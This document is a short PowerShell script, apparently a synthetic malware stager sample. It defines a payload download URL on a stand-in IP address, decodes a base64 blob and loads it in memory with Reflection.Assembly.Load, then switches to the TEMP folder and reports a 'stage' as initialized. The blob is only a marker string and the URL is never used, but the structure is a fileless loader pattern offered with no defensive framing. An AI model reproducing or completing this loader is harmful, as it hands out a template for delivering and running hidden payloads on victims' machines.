
$FetchUrl = "http://192.0.2.232/payload.bin"
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp1bHlydmdiaWNx')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $OperationResult) {
    Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Set-Location -Path $env:TEMP
Write-Output "stage 28 initialized"
Write-Verbose "Applying operation timeout"
Write-Verbose "Validating result"
